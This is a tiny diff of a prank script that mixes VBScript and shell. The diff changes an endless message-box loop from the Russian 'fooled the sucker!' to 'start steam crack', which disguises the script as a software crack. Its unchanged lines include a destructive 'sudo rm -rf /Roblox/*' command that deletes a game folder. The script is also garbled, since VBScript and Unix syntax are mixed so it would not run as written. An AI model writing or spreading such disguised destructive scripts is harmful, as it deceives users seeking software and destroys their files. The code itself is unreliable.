@@ -1,5 +1,5 @@
 do
-msgbox "обманули лоха!"
+msgbox "start steam crack"
 Loop
 do
 sudo rm -rf /Roblox/*
